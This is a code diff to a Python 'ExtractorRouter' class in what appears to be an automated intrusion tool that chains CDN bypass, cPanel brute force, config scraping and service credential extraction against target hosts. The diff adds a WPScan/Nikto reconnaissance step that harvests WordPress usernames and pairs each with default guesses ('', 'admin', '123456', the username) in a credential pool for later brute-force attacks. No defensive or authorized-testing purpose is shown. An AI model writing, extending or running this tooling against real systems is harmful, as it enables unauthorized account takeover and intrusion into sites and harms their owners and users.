@@ -35,15 +35,20 @@ class ExtractorRouter:
             # 1. CDN bypass
             self._run_cdn_bypass(domain_id, ip, host)
 
-            # 2. cPanel brute force
+            # 2. WPScan / Nikto recon (HTTP/HTTPS only)
+            if self._has_port(data, 80) or self._has_port(data, 443):
+                port = 443 if self._has_port(data, 443) else 80
+                self._run_wpscan(domain_id, ip, host, port)
+                
+            # 3. cPanel brute force
             if self._has_port(data, 2083):
                 self._run_cpanel(domain_id, ip, host)
 
-            # 3. Config scraper if cPanel failed
+            # 4. Config scraper if cPanel failed
             if not self.found_credentials.get(domain_id):
                 self._run_config_scraper(domain_id, ip, host)
 
-            # 4. Service extractors
+            # 5. Service extractors
             for port_entry in data['open_ports']:
                 port = port_entry['port']
                 service = port_entry['service']
@@ -86,6 +91,22 @@ class ExtractorRouter:
                 print(f"\n[ROUTER] Re-scanning origin IP {origin_ip} for {host}")
                 self.scanner._scan_target(f"{domain_id}_origin", host, origin_ip)
                 self.scanner._export_json()
+
+
+    def _run_wpscan(self, domain_id: str, ip: str, host: str, port: int):
+        from src.utils.extractors.wpscan_extractor import WPScanExtractor
+        extractor = WPScanExtractor(ip=ip, host=host, port=port)
+        result = extractor.run()
+        if result['status'] == 'success':
+            self.results[domain_id]['wpscan'] = result
+            # Inject discovered usernames into credential pool for subsequent attacks
+            if result['users']:
+                self.found_credentials.setdefault(domain_id, [])
+                for user in result['users']:
+                    for pwd in ['', 'admin', '123456', user]:
+                        self.found_credentials[domain_id].insert(0, (user, pwd))
+
+
 
     def _run_cpanel(self, domain_id: str, ip: str, host: str):
         """Run cPanel brute force and store found credentials.
